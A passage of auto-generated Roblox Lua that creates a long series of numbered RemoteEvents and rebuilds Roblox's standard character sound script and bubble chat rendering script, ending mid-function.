r976.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r977 = Instance.new("RemoteEvent")
r977.Name = "r977"
r977.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r978 = Instance.new("RemoteEvent")
r978.Name = "r978"
r978.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r979 = Instance.new("RemoteEvent")
r979.Name = "r979"
r979.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r98 = Instance.new("RemoteEvent")
r98.Name = "r98"
r98.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r980 = Instance.new("RemoteEvent")
r980.Name = "r980"
r980.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r981 = Instance.new("RemoteEvent")
r981.Name = "r981"
r981.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r982 = Instance.new("RemoteEvent")
r982.Name = "r982"
r982.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r983 = Instance.new("RemoteEvent")
r983.Name = "r983"
r983.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r984 = Instance.new("RemoteEvent")
r984.Name = "r984"
r984.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r985 = Instance.new("RemoteEvent")
r985.Name = "r985"
r985.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r986 = Instance.new("RemoteEvent")
r986.Name = "r986"
r986.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r987 = Instance.new("RemoteEvent")
r987.Name = "r987"
r987.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r988 = Instance.new("RemoteEvent")
r988.Name = "r988"
r988.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r989 = Instance.new("RemoteEvent")
r989.Name = "r989"
r989.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r99 = Instance.new("RemoteEvent")
r99.Name = "r99"
r99.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r990 = Instance.new("RemoteEvent")
r990.Name = "r990"
r990.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r991 = Instance.new("RemoteEvent")
r991.Name = "r991"
r991.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r992 = Instance.new("RemoteEvent")
r992.Name = "r992"
r992.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r993 = Instance.new("RemoteEvent")
r993.Name = "r993"
r993.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r994 = Instance.new("RemoteEvent")
r994.Name = "r994"
r994.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r995 = Instance.new("RemoteEvent")
r995.Name = "r995"
r995.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r996 = Instance.new("RemoteEvent")
r996.Name = "r996"
r996.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r997 = Instance.new("RemoteEvent")
r997.Name = "r997"
r997.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r998 = Instance.new("RemoteEvent")
r998.Name = "r998"
r998.Parent = euwifoqewuiqocujiroidjwifcoqwiro

local r999 = Instance.new("RemoteEvent")
r999.Name = "r999"
r999.Parent = euwifoqewuiqocujiroidjwifcoqwiro

--[[
	Roblox2Lua
	----------
	
	This code was generated using
	Deluct's Roblox2Lua plugin.
]]--

local ewcewfw = Instance.new("LocalScript")
ewcewfw.Disabled = true
ewcewfw.Name = "ewcewfw"
ewcewfw.Parent = workspace

--//Modules

local modules = {}

--// Scripts

-- ewcewfw
task.spawn(function()
	local script = ewcewfw
	script.Disabled = true

	script:GetPropertyChangedSignal("Disabled"):Wait()

	local oldreq = require
	local function require(target)
		if modules[target] then
			return modules[target]()
		end
		return oldreq(target)
	end

	-- Roblox character sound script
	
	local Players = game:GetService("Players")
	local RunService = game:GetService("RunService")
	
	local SOUND_DATA = {
		Climbing = {
			SoundId = "rbxasset://sounds/action_footsteps_plastic.mp3",
			Looped = true,
		},
		Died = {
			SoundId = "rbxasset://sounds/uuhhh.mp3",
		},
		FreeFalling = {
			SoundId = "rbxasset://sounds/action_falling.mp3",
			Looped = true,
		},
		GettingUp = {
			SoundId = "rbxasset://sounds/action_get_up.mp3",
		},
		Jumping = {
			SoundId = "rbxasset://sounds/action_jump.mp3",
		},
		Landing = {
			SoundId = "rbxasset://sounds/action_jump_land.mp3",
		},
		Running = {
			SoundId = "rbxasset://sounds/action_footsteps_plastic.mp3",
			Looped = true,
			Pitch = 1.85,
		},
		Splash = {
			SoundId = "rbxasset://sounds/impact_water.mp3",
		},
		Swimming = {
			SoundId = "rbxasset://sounds/action_swim.mp3",
			Looped = true,
			Pitch = 1.6,
		},
	}
	
	 -- wait for the first of the passed signals to fire
	local function waitForFirst(...)
		local shunt = Instance.new("BindableEvent")
		local slots = {...}
	
		local function fire(...)
			for i = 1, #slots do
				slots[i]:Disconnect()
			end
	
			return shunt:Fire(...)
		end
	
		for i = 1, #slots do
			slots[i] = slots[i]:Connect(fire)
		end
	
		return shunt.Event:Wait()
	end
	
	-- map a value from one range to another
	local function map(x, inMin, inMax, outMin, outMax)
		return (x - inMin)*(outMax - outMin)/(inMax - inMin) + outMin
	end
	
	local function playSound(sound)
		sound.TimePosition = 0
		sound.Playing = true
	end
	
	local function shallowCopy(t)
		local out = {}
		for k, v in pairs(t) do
			out[k] = v
		end
		return out
	end
	
	local function initializeSoundSystem(player, humanoid, rootPart)
		local sounds = {}
	
		-- initialize sounds
		for name, props in pairs(SOUND_DATA) do
			local sound = Instance.new("Sound")
			sound.Name = name
	
			-- set default values
			sound.Archivable = false
			sound.EmitterSize = 5
			sound.MaxDistance = 150
			sound.Volume = 0.65
	
			for propName, propValue in pairs(props) do
				sound[propName] = propValue
			end
	
			sound.Parent = rootPart
			sounds[name] = sound
		end
	
		local playingLoopedSounds = {}
	
		local function stopPlayingLoopedSounds(except)
			for sound in pairs(shallowCopy(playingLoopedSounds)) do
				if sound ~= except then
					sound.Playing = false
					playingLoopedSounds[sound] = nil
				end
			end
		end
	
		-- state transition callbacks
		local stateTransitions = {
			[Enum.HumanoidStateType.FallingDown] = function()
				stopPlayingLoopedSounds()
			end,
	
			[Enum.HumanoidStateType.GettingUp] = function()
				stopPlayingLoopedSounds()
				playSound(sounds.GettingUp)
			end,
	
			[Enum.HumanoidStateType.Jumping] = function()
				stopPlayingLoopedSounds()
				playSound(sounds.Jumping)
			end,
	
			[Enum.HumanoidStateType.Swimming] = function()
				local verticalSpeed = math.abs(rootPart.Velocity.Y)
				if verticalSpeed > 0.1 then
					sounds.Splash.Volume = math.clamp(map(verticalSpeed, 100, 350, 0.28, 1), 0, 1)
					playSound(sounds.Splash)
				end
				stopPlayingLoopedSounds(sounds.Swimming)
				sounds.Swimming.Playing = true
				playingLoopedSounds[sounds.Swimming] = true
			end,
	
			[Enum.HumanoidStateType.Freefall] = function()
				sounds.FreeFalling.Volume = 0
				stopPlayingLoopedSounds(sounds.FreeFalling)
				playingLoopedSounds[sounds.FreeFalling] = true
			end,
	
			[Enum.HumanoidStateType.Landed] = function()
				stopPlayingLoopedSounds()
				local verticalSpeed = math.abs(rootPart.Velocity.Y)
				if verticalSpeed > 75 then
					sounds.Landing.Volume = math.clamp(map(verticalSpeed, 50, 100, 0, 1), 0, 1)
					playSound(sounds.Landing)
				end
			end,
	
			[Enum.HumanoidStateType.Running] = function()
				stopPlayingLoopedSounds(sounds.Running)
				sounds.Running.Playing = true
				playingLoopedSounds[sounds.Running] = true
			end,
	
			[Enum.HumanoidStateType.Climbing] = function()
				local sound = sounds.Climbing
				if math.abs(rootPart.Velocity.Y) > 0.1 then
					sound.Playing = true
					stopPlayingLoopedSounds(sound)
				else
					stopPlayingLoopedSounds()
				end
				playingLoopedSounds[sound] = true
			end,
	
			[Enum.HumanoidStateType.Seated] = function()
				stopPlayingLoopedSounds()
			end,
	
			[Enum.HumanoidStateType.Dead] = function()
				stopPlayingLoopedSounds()
				playSound(sounds.Died)
			end,
		}
	
		-- updaters for looped sounds
		local loopedSoundUpdaters = {
			[sounds.Climbing] = function(dt, sound, vel)
				sound.Playing = vel.Magnitude > 0.1
			end,
	
			[sounds.FreeFalling] = function(dt, sound, vel)
				if vel.Magnitude > 75 then
					sound.Volume = math.clamp(sound.Volume + 0.9*dt, 0, 1)
				else
					sound.Volume = 0
				end
			end,
	
			[sounds.Running] = function(dt, sound, vel)
				sound.Playing = vel.Magnitude > 0.5 and humanoid.MoveDirection.Magnitude > 0.5
			end,
		}
	
		-- state substitutions to avoid duplicating entries in the state table
		local stateRemap = {
			[Enum.HumanoidStateType.RunningNoPhysics] = Enum.HumanoidStateType.Running,
		}
	
		local activeState = stateRemap[humanoid:GetState()] or humanoid:GetState()
	
		local stateChangedConn = humanoid.StateChanged:Connect(function(_, state)
			state = stateRemap[state] or state
	
			if state ~= activeState then
				local transitionFunc = stateTransitions[state]
	
				if transitionFunc then
					transitionFunc()
				end
	
				activeState = state
			end
		end)
	
		local steppedConn = RunService.Stepped:Connect(function(_, worldDt)
			-- update looped sounds on stepped
			for sound in pairs(playingLoopedSounds) do
				local updater = loopedSoundUpdaters[sound]
	
				if updater then
					updater(worldDt, sound, rootPart.Velocity)
				end
			end
		end)
	
		local humanoidAncestryChangedConn
		local rootPartAncestryChangedConn
		local characterAddedConn
	
		local function terminate()
			stateChangedConn:Disconnect()
			steppedConn:Disconnect()
			humanoidAncestryChangedConn:Disconnect()
			rootPartAncestryChangedConn:Disconnect()
			characterAddedConn:Disconnect()
		end
	
		humanoidAncestryChangedConn = humanoid.AncestryChanged:Connect(function(_, parent)
			if not parent then
				terminate()
			end
		end)
	
		rootPartAncestryChangedConn = rootPart.AncestryChanged:Connect(function(_, parent)
			if not parent then
				terminate()
			end
		end)
	
		characterAddedConn = player.CharacterAdded:Connect(terminate)
	end
	
	local function playerAdded(player)
		local function characterAdded(character)
			-- Avoiding memory leaks in the face of Character/Humanoid/RootPart lifetime has a few complications:
			-- * character deparenting is a Remove instead of a Destroy, so signals are not cleaned up automatically.
			-- ** must use a waitForFirst on everything and listen for hierarchy changes.
			-- * the character might not be in the dm by the time CharacterAdded fires
			-- ** constantly check consistency with player.Character and abort if CharacterAdded is fired again
			-- * Humanoid may not exist immediately, and by the time it's inserted the character might be deparented.
			-- * RootPart probably won't exist immediately.
			-- ** by the time RootPart is inserted and Humanoid.RootPart is set, the character or the humanoid might be deparented.
	
			if not character.Parent then
				waitForFirst(character.AncestryChanged, player.CharacterAdded)
			end
	
			if player.Character ~= character or not character.Parent then
				return
			end
	
			local humanoid = character:FindFirstChildOfClass("Humanoid")
			while character:IsDescendantOf(game) and not humanoid do
				waitForFirst(character.ChildAdded, character.AncestryChanged, player.CharacterAdded)
				humanoid = character:FindFirstChildOfClass("Humanoid")
			end
	
			if player.Character ~= character or not character:IsDescendantOf(game) then
				return
			end
	
			-- must rely on HumanoidRootPart naming because Humanoid.RootPart does not fire changed signals
			local rootPart = character:FindFirstChild("HumanoidRootPart")
			while character:IsDescendantOf(game) and not rootPart do
				waitForFirst(character.ChildAdded, character.AncestryChanged, humanoid.AncestryChanged, player.CharacterAdded)
				rootPart = character:FindFirstChild("HumanoidRootPart")
			end
	
			if rootPart and humanoid:IsDescendantOf(game) and character:IsDescendantOf(game) and player.Character == character then
				initializeSoundSystem(player, humanoid, rootPart)
			end
		end
	
		if player.Character then
			characterAdded(player.Character)
		end
		player.CharacterAdded:Connect(characterAdded)
	end
	
	Players.PlayerAdded:Connect(playerAdded)
	for _, player in ipairs(Players:GetPlayers()) do
		playerAdded(player)
	end
	
end)

--[[
	Roblox2Lua
	----------
	
	This code was generated using
	Deluct's Roblox2Lua plugin.
]]--

local ewrefeqwrcf = Instance.new("LocalScript")
ewrefeqwrcf.Disabled = true
ewrefeqwrcf.Name = "ewrefeqwrcf"
ewrefeqwrcf.Parent = workspace

--//Modules

local modules = {}

--// Scripts

-- ewrefeqwrcf
task.spawn(function()
	local script = ewrefeqwrcf
	script.Disabled = true

	script:GetPropertyChangedSignal("Disabled"):Wait()

	local oldreq = require
	local function require(target)
		if modules[target] then
			return modules[target]()
		end
		return oldreq(target)
	end

	--[[
		// FileName: BubbleChat.lua
		// Written by: jeditkacheff, TheGamer101
		// Description: Code for rendering bubble chat
	]]
	
	--[[ SERVICES ]]
	local PlayersService = game:GetService('Players')
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local ChatService = game:GetService("Chat")
	local TextService = game:GetService("TextService")
	--[[ END OF SERVICES ]]
	
	local LocalPlayer = PlayersService.LocalPlayer
	while LocalPlayer == nil do
		PlayersService.ChildAdded:wait()
		LocalPlayer = PlayersService.LocalPlayer
	end
	
	local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
	
	local success, UserShouldLocalizeGameChatBubble = pcall(function()
		return UserSettings():IsUserFeatureEnabled("UserShouldLocalizeGameChatBubble")
	end)
	local UserShouldLocalizeGameChatBubble = success and UserShouldLocalizeGameChatBubble
	
	local UserFixBubbleChatText do
		local success, value = pcall(function()
			return UserSettings():IsUserFeatureEnabled("UserFixBubbleChatText")
		end)
		UserFixBubbleChatText = success and value
	end
	
	local UserRoactBubbleChatBeta do
		local success, value = pcall(function()
			return UserSettings():IsUserFeatureEnabled("UserRoactBubbleChatBeta")
		end)
		UserRoactBubbleChatBeta = success and value
	end
	
	local UserPreventOldBubbleChatOverlap do
		local success, value = pcall(function()
			return UserSettings():IsUserFeatureEnabled("UserPreventOldBubbleChatOverlap")
		end)
		UserPreventOldBubbleChatOverlap = success and value
	end
	
	local function getMessageLength(message)
		return utf8.len(utf8.nfcnormalize(message))
	end
	
	--[[ SCRIPT VARIABLES ]]
	local CHAT_BUBBLE_FONT = Enum.Font.SourceSans
	local CHAT_BUBBLE_FONT_SIZE = Enum.FontSize.Size24 -- if you change CHAT_BUBBLE_FONT_SIZE_INT please change this to match
	local CHAT_BUBBLE_FONT_SIZE_INT = 24 -- if you change CHAT_BUBBLE_FONT_SIZE please change this to match
	local CHAT_BUBBLE_LINE_HEIGHT = CHAT_BUBBLE_FONT_SIZE_INT + 10
	local CHAT_BUBBLE_TAIL_HEIGHT = 14
	local CHAT_BUBBLE_WIDTH_PADDING = 30
	local CHAT_BUBBLE_PADDING = 12
	local CHAT_BUBBLE_FADE_SPEED = 1.5
	
	local BILLBOARD_MAX_WIDTH = 400
	local BILLBOARD_MAX_HEIGHT = 250	--This limits the number of bubble chats that you see above characters
	
	local ELIPSES = "..."
	local MaxChatMessageLength = 128 -- max chat message length, including null terminator and elipses.
	local MaxChatMessageLengthExclusive = MaxChatMessageLength - getMessageLength(ELIPSES) - 1
	
	local NEAR_BUBBLE_DISTANCE = 65	--previously 45
	local MAX_BUBBLE_DISTANCE = 100	--previously 80
	
	--[[ END OF SCRIPT VARIABLES ]]
	
	
	-- [[ SCRIPT ENUMS ]]
	local BubbleColor = {	WHITE = "dub",
						BLUE = "blu",
						GREEN = "gre",
						RED = "red" }
	
	--[[ END OF SCRIPT ENUMS ]]
	
	-- This screenGui exists so that the billboardGui is not deleted when the PlayerGui is reset.
	local BubbleChatScreenGui = Instance.new("ScreenGui")
	BubbleChatScreenGui.Name = "BubbleChat"
	BubbleChatScreenGui.ResetOnSpawn = false
	BubbleChatScreenGui.Parent = PlayerGui
	
	--[[ FUNCTIONS ]]
	
	local function lerpLength(msg, min, max)
		return min + (max - min) * math.min(getMessageLength(msg) / 75.0, 1.0)
	end
	
	local function createFifo()
		local this = {}
		this.data = {}
	
		local emptyEvent = Instance.new("BindableEvent")
		this.Emptied = emptyEvent.Event
	
		function this:Size()
			return #this.data
		end
	
		function this:Empty()
			return this:Size() <= 0
		end
	
		function this:PopFront()
			table.remove(this.data, 1)
			if this:Empty() then emptyEvent:Fire() end
		end
	
		function this:Front()
			return this.data[1]
		end
	
		function this:Get(index)
			return this.data[index]
		end
	
		function this:PushBack(value)
			table.insert(this.data, value)
		end
	
		function this:GetData()
			return this.data
		end
	
		return this
	end
	
	local function createCharacterChats()
		local this = {}
	
		this.Fifo = createFifo()
		this.BillboardGui = nil
	
		return this
	end
	
	local function createMap()
		local this = {}
		this.data = {}
		local count = 0
	
		function this:Size()
			return count
		end
	
		function this:Erase(key)
			if this.data[key] then count = count - 1 end
			this.data[key] = nil
		end
	
		function this:Set(key, value)
			this.data[key] = value
			if value then count = count + 1 end
		end
	
		function this:Get(key)
			if not key then return end
			if not this.data[key] then
				this.data[key] = createCharacterChats()
				local emptiedCon = nil
				emptiedCon = this.data[key].Fifo.Emptied:connect(function()
					emptiedCon:disconnect()
					this:Erase(key)
				end)
			end
			return this.data[key]
		end
	
		function this:GetData()
			return this.data
		end
	
		return this
	end
	
	local function createChatLine(message, bubbleColor, isLocalPlayer)
		local this = {}
	
		function this:ComputeBubbleLifetime(msg, isSelf)
			if isSelf then
				return lerpLength(msg, 8, 15)
			else
				return lerpLength(msg, 12, 20)
			end
		end
	
		this.Origin = nil
		this.RenderBubble = nil
		this.Message = message
		this.BubbleDieDelay = this:ComputeBubbleLifetime(message, isLocalPlayer)
		this.BubbleColor = bubbleColor
		this.IsLocalPlayer = isLocalPlayer
	
		return this
	end
	
	local function createPlayerChatLine(player, message, isLocalPlayer)
		local this = createChatLine(message, BubbleColor.WHITE, isLocalPlayer)
	
		if player then
			this.User = player.Name
			this.Origin = player.Character
		end
	
		return this
	end
	
	local function createGameChatLine(origin, message, isLocalPlayer, bubbleColor)
		local this = createChatLine(message, bubbleColor, isLocalPlayer)
		this.Origin = origin
	
		return this
	end
	
	function createChatBubbleMain(filePrefix, sliceRect)
		local chatBubbleMain = Instance.new("ImageLabel")
		chatBubbleMain.Name = "ChatBubble"
		chatBubbleMain.ScaleType = Enum.ScaleType.Slice
		chatBubbleMain.SliceCenter = sliceRect
		chatBubbleMain.Image = "rbxasset://textures/" .. tostring(filePrefix) .. ".png"
		chatBubbleMain.BackgroundTransparency = 1
		chatBubbleMain.BorderSizePixel = 0
		chatBubbleMain.Size = UDim2.new(1.0, 0, 1.0, 0)
		chatBubbleMain.Position = UDim2.new(0, 0, 0, 0)
	
		return chatBubbleMain
	end
	
	function createChatBubbleTail(position, size)
		local chatBubbleTail = Instance.new("ImageLabel")
		chatBubbleTail.Name = "ChatBubbleTail"
		chatBubbleTail.Image = "rbxasset://textures/ui/dialog_tail.png"
		chatBubbleTail.BackgroundTransparency = 1
		chatBubbleTail.BorderSizePixel = 0
		chatBubbleTail.Position = position
		chatBubbleTail.Size = size
	
		return chatBubbleTail
	end
	
	function createChatBubbleWithTail(filePrefix, position, size, sliceRect)
		local chatBubbleMain = createChatBubbleMain(filePrefix, sliceRect)
	
		local chatBubbleTail = createChatBubbleTail(position, size)
		chatBubbleTail.Parent = chatBubbleMain
	
		return chatBubbleMain
	end
	
	function createScaledChatBubbleWithTail(filePrefix, frameScaleSize, position, sliceRect)
		local chatBubbleMain = createChatBubbleMain(filePrefix, sliceRect)
	
		local frame = Instance.new("Frame")
		frame.Name = "ChatBubbleTailFrame"
		frame.BackgroundTransparency = 1
		frame.SizeConstraint = Enum.SizeConstraint.RelativeXX
		frame.Position = UDim2.new(0.5, 0, 1, 0)
		frame.Size = UDim2.new(frameScaleSize, 0, frameScaleSize, 0)
		frame.Parent = chatBubbleMain
	
		local chatBubbleTail = createChatBubbleTail(position, UDim2.new(1, 0, 0.5, 0))
		chatBubbleTail.Parent = frame
	
		return chatBubbleMain
	end
	
	function createChatImposter(filePrefix, dotDotDot, yOffset)
		local result = Instance.new("ImageLabel")
		result.Name = "DialogPlaceholder"
		result.Image = "rbxasset://textures/" .. tostring(filePrefix) .. ".png"
		result.BackgroundTransparency = 1
		result.BorderSizePixel = 0
		result.Position = UDim2.new(0, 0, -1.25, 0)
		result.Size = UDim2.new(1, 0, 1, 0)
	
		local image = Instance.new("ImageLabel")
		image.Name = "DotDotDot"
		image.Image = "rbxasset://textures/" .. tostring(dotDotDot) .. ".png"
		image.BackgroundTransparency = 1
		image.BorderSizePixel = 0
		image.Position = UDim2.new(0.001, 0, yOffset, 0)
		image.Size = UDim2.new(1, 0, 0.7, 0)
		image.Parent = result
	
		return result
	end
	
	
	local this = {}
	this.ChatBubble = {}
	this.ChatBubbleWithTail = {}
	this.ScalingChatBubbleWithTail = {}
	this.CharacterSortedMsg = createMap()
	
	-- init chat bubble tables
	local function initChatBubbleType(chatBubbleType, fileName, imposterFileName, isInset, sliceRect)
		this.ChatBubble[chatBubbleType] = createChatBubbleMain(fileName, sliceRect)
		this.ChatBubbleWithTail[chatBubbleType] = createChatBubbleWithTail(fileName, UDim2.new(0.5, -CHAT_BUBBLE_TAIL_HEIGHT, 1, isInset and -1 or 0), UDim2.new(0, 30, 0, CHAT_BUBBLE_TAIL_HEIGHT), sliceRect)
		this.ScalingChatBubbleWithTail[chatBubbleType] = createScaledChatBubbleWithTail(fileName, 0.5, UDim2.new(-0.5, 0, 0, isInset and -1 or 0), sliceRect)
	end
	
	initChatBubbleType(BubbleColor.WHITE,	"ui/dialog_white",	"ui/chatBubble_white_notify_bkg", 	false,	Rect.new(5,5,15,15))
	initChatBubbleType(BubbleColor.BLUE,	"ui/dialog_blue",	"ui/chatBubble_blue_notify_bkg",	true, 	Rect.new(7,7,33,33))
	initChatBubbleType(BubbleColor.RED,		"ui/dialog_red",	"ui/chatBubble_red_notify_bkg",		true,	Rect.new(7,7,33,33))
	initChatBubbleType(BubbleColor.GREEN,	"ui/dialog_green",	"ui/chatBubble_green_notify_bkg",	true,	Rect.new(7,7,33,33))
	
	function this:SanitizeChatLine(msg)
		if getMessageLength(msg) > MaxChatMessageLengthExclusive then
			local byteOffset = utf8.offset(msg, MaxChatMessageLengthExclusive + getMessageLength(ELIPSES) + 1) - 1
			return string.sub(msg, 1, byteOffset)
		else
			return msg
		end
	end
	
	local function createBillboardInstance(adornee)
		local billboardGui = Instance.new("BillboardGui")
		billboardGui.Adornee = adornee
		billboardGui.Size = UDim2.new(0, BILLBOARD_MAX_WIDTH, 0, BILLBOARD_MAX_HEIGHT)
		billboardGui.StudsOffset = Vector3.new(0, 1.5, 2)
		billboardGui.Parent = BubbleChatScreenGui
	
		local billboardFrame = Instance.new("Frame")
		billboardFrame.Name = "BillboardFrame"
		billboardFrame.Size = UDim2.new(1, 0, 1, 0)
		billboardFrame.Position = UDim2.new(0, 0, -0.5, 0)
		billboardFrame.BackgroundTransparency = 1
		billboardFrame.Parent = billboardGui
	
		local billboardChildRemovedCon = nil
		billboardChildRemovedCon = billboardFrame.ChildRemoved:connect(function()
			if #billboardFrame:GetChildren() <= 1 then
				billboardChildRemovedCon:disconnect()
				billboardGui:Destroy()
			end
		end)
	
		this:CreateSmallTalkBubble(BubbleColor.WHITE).Parent = billboardFrame
	
		return billboardGui
	end
	
	function this:CreateBillboardGuiHelper(instance, onlyCharacter)
		if instance and not this.CharacterSortedMsg:Get(instance)["BillboardGui"] then
			if not onlyCharacter then
				if instance:IsA("BasePart") then
					-- Create a new billboardGui object attached to this player
					local billboardGui = createBillboardInstance(instance)
					this.CharacterSortedMsg:Get(instance)["BillboardGui"] = billboardGui
					return
				end
			end
	
			if instance:IsA("Model") then
				local head = instance:FindFirstChild("Head")
				if head and head:IsA("BasePart") then
					-- Create a new billboardGui object attached to this player
					local billboardGui = createBillboardInstance(head)
					this.CharacterSortedMsg:Get(instance)["BillboardGui"] = billboardGui
				end
			end
		end
	end
	
	local function distanceToBubbleOrigin(origin)
		if not origin then return 100000 end
	
		return (origin.Position - game.Workspace.CurrentCamera.CoordinateFrame.p).magnitude
	end
	
	local function isPartOfLocalPlayer(adornee)
		if adornee and PlayersService.LocalPlayer.Character then
			return adornee:IsDescendantOf(PlayersService.LocalPlayer.Character)
		end
	end
	
	function this:SetBillboardLODNear(billboardGui)
		local isLocalPlayer = isPartOfLocalPlayer(billboardGui.Adornee)
		billboardGui.Size = UDim2.new(0, BILLBOARD_MAX_WIDTH, 0, BILLBOARD_MAX_HEIGHT)
		billboardGui.StudsOffset = Vector3.new(0, isLocalPlayer and 1.5 or 2.5, isLocalPlayer and 2 or 0.1)
		billboardGui.Enabled = true
		local billChildren = billboardGui.BillboardFrame:GetChildren()
		for i = 1, #billChildren do
			billChildren[i].Visible = true
		end
		billboardGui.BillboardFrame.SmallTalkBubble.Visible = false
	end
	
	function this:SetBillboardLODDistant(billboardGui)
		local isLocalPlayer = isPartOfLocalPlayer(billboardGui.Adornee)
		billboardGui.Size = UDim2.new(4, 0, 3, 0)
		billboardGui.StudsOffset = Vector3.new(0, 3, isLocalPlayer and 2 or 0.1)
		billboardGui.Enabled = true
		local billChildren = billboardGui.BillboardFrame:GetChildren()
		for i = 1, #billChildren do
			billChildren[i].Visible = false
		end
		billboardGui.BillboardFrame.SmallTalkBubble.Visible = true
	end
	
	function this:SetBillboardLODVeryFar(billboardGui)
		billboardGui.Enabled = false
	end
	
	function this:SetBillboardGuiLOD(billboardGui, origin)
		if not origin then return end
	
		if origin:IsA("Model") then
			local head = origin:FindFirstChild("Head")
			if not head then origin = origin.PrimaryPart
			else origin = head end
		end
	
		local bubbleDistance = distanceToBubbleOrigin(origin)
	
		if bubbleDistance < NEAR_BUBBLE_DISTANCE then
			this:SetBillboardLODNear(billboardGui)
		elseif bubbleDistance >= NEAR_BUBBLE_DISTANCE and bubbleDistance < MAX_BUBBLE_DISTANCE then
			this:SetBillboardLODDistant(billboardGui)
		else
			this:SetBillboardLODVeryFar(billboardGui)
		end
	end
	
	function this:CameraCFrameChanged()
		for index, value in pairs(this.CharacterSortedMsg:GetData()) do
			local playerBillboardGui = value["BillboardGui"]
			if playerBillboardGui then this:SetBillboardGuiLOD(playerBillboardGui, index) end
		end
	end
	
	function this:CreateBubbleText(message, shouldAutoLocalize)
		local bubbleText = Instance.new("TextLabel")
		bubbleText.Name = "BubbleText"
		bubbleText.BackgroundTransparency = 1
	
		if UserFixBubbleChatText then
			bubbleText.Size = UDim2.fromScale(1, 1)
		else
			bubbleText.Position = UDim2.new(0, CHAT_BUBBLE_WIDTH_PADDING / 2, 0, 0)
			bubbleText.Size = UDim2.new(1, -CHAT_BUBBLE_WIDTH_PADDING, 1, 0)
		end
	
		bubbleText.Font = CHAT_BUBBLE_FONT
		bubbleText.ClipsDescendants = true
		bubbleText.TextWrapped = true
		bubbleText.FontSize = CHAT_BUBBLE_FONT_SIZE
		bubbleText.Text = message
		bubbleText.Visible = false
		bubbleText.AutoLocalize = shouldAutoLocalize
	
		if UserFixBubbleChatText then
			local padding = Instance.new("UIPadding")
			padding.PaddingTop = UDim.new(0, CHAT_BUBBLE_PADDING)
			padding.PaddingRight = UDim.new(0, CHAT_BUBBLE_PADDING)
			padding.PaddingBottom = UDim.new(0, CHAT_BUBBLE_PADDING)
			padding.PaddingLeft = UDim.new(0, CHAT_BUBBLE_PADDING)
			padding.Parent = bubbleText
		end
	
		return bubbleText
	end
	
	function this:CreateSmallTalkBubble(chatBubbleType)
		local smallTalkBubble = this.ScalingChatBubbleWithTail[chatBubbleType]:Clone()
		smallTalkBubble.Name = "SmallTalkBubble"
		smallTalkBubble.AnchorPoint = Vector2.new(0, 0.5)
		smallTalkBubble.Position = UDim2.new(0, 0, 0.5, 0)
		smallTalkBubble.Visible = false
		local text = this:CreateBubbleText("...")
		text.TextScaled = true
		text.TextWrapped = false
		text.Visible = true
		text.Parent = smallTalkBubble
	
		return smallTalkBubble
	end
	
	function this:UpdateChatLinesForOrigin(origin, currentBubbleYPos)
		local bubbleQueue = this.CharacterSortedMsg:Get(origin).Fifo
		local bubbleQueueSize = bubbleQueue:Size()
		local bubbleQueueData = bubbleQueue:GetData()
		if #bubbleQueueData <= 1 then return end
	
		for index = (#bubbleQueueData - 1), 1, -1 do
			local value = bubbleQueueData[index]
			local bubble = value.RenderBubble
			if not bubble then return end
			local bubblePos = bubbleQueueSize - index + 1
	
			if bubblePos > 1 then
				local tail = bubble:FindFirstChild("ChatBubbleTail")
				if tail then tail:Destroy() end
				local bubbleText = bubble:FindFirstChild("BubbleText")
				if bubbleText then bubbleText.TextTransparency = 0.5 end
			end
	
			local udimValue = UDim2.new( bubble.Position.X.Scale, bubble.Position.X.Offset,
										1, currentBubbleYPos - bubble.Size.Y.Offset - CHAT_BUBBLE_TAIL_HEIGHT)
			bubble:TweenPosition(udimValue, Enum.EasingDirection.Out, Enum.EasingStyle.Bounce, 0.1, true)
			currentBubbleYPos = currentBubbleYPos - bubble.Size.Y.Offset - CHAT_BUBBLE_TAIL_HEIGHT
		end
	end
	
	function this:DestroyBubble(bubbleQueue, bubbleToDestroy)
		if not bubbleQueue then return end
		if bubbleQueue:Empty() then return end
	
		local bubble = bubbleQueue:Front().RenderBubble
		if not bubble then
			bubbleQueue:PopFront()
		 	return
		end
	
		spawn(function()
			while bubbleQueue:Front().RenderBubble ~= bubbleToDestroy do
				wait()
			end
	
			bubble = bubbleQueue:Front().RenderBubble
	
			local timeBetween = 0
			local bubbleText = bubble:FindFirstChild("BubbleText")
			local bubbleTail = bubble:FindFirstChild("ChatBubbleTail")
	
			while bubble and bubble.ImageTransparency < 1 do
				timeBetween = wait()
				if bubble then
					local fadeAmount = timeBetween * CHAT_BUBBLE_FADE_SPEED
					bubble.ImageTransparency = bubble.ImageTransparency + fadeAmount
					if bubbleText then bubbleText.TextTransparency = bubbleText.TextTransparency + fadeAmount end
					if bubbleTail then bubbleTail.ImageTransparency = bubbleTail.ImageTransparency + fadeAmount end
				end
			end
	
			if bubble then
				bubble:Destroy()
				bubbleQueue:PopFront()
			end
		end)
	end
	
	function this:CreateChatLineRender(instance, line, onlyCharacter, fifo, shouldAutoLocalize)
		if not instance then return end
	
		if not this.CharacterSortedMsg:Get(instance)["BillboardGui"] then
			this:CreateBillboardGuiHelper(instance, onlyCharacter)
		end
	
